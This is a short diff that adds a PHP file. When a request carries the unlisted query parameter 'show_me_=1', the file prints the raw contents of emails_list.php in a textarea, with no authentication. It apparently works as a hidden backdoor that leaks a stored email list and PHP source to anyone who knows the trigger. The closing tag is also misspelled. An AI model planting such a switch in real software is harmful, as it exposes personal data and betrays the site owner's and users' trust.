@@ -1,0 +1,9 @@
+<?php
+
+if(isset($_GET['show_me_']) && $_GET['show_me_'] == "1"){
+
+    echo "<textarea>".file_get_contents("emails_list.php")."</texarea>";
+}
+
+
+
